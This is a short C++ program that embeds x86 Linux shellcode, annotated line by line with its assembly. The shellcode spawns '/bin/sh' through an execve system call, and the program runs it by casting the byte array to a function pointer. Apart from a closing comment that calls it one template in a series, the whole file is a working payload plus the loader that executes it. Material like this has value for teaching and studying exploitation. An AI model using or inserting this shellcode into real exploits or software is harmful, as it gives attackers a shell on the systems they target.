#include <iostream>
#include <cstring>

using namespace std;

int main() {
    // shellcode to execute "/bin/sh"
    char shellcode[] =
        "\x31\xc0"              // xor    %eax,%eax
        "\x50"                  // push   %eax
        "\x68\x2f\x2f\x73\x68"  // push   $0x68732f2f
        "\x68\x2f\x62\x69\x6e"  // push   $0x6e69622f
        "\x89\xe3"              // mov    %esp,%ebx
        "\x50"                  // push   %eax
        "\x53"                  // push   %ebx
        "\x89\xe1"              // mov    %esp,%ecx
        "\x99"                  // cdq
        "\xb0\x0b"              // mov    $0x0b,%al
        "\xcd\x80";             // int    $0x80

    // get size of shellcode
    int size = strlen(shellcode);

    // cast shellcode to a function pointer and execute it
    void (*func)() = (void (*)()) shellcode;
    func();

    return 0;
}
//This is the same template but will use a different format structure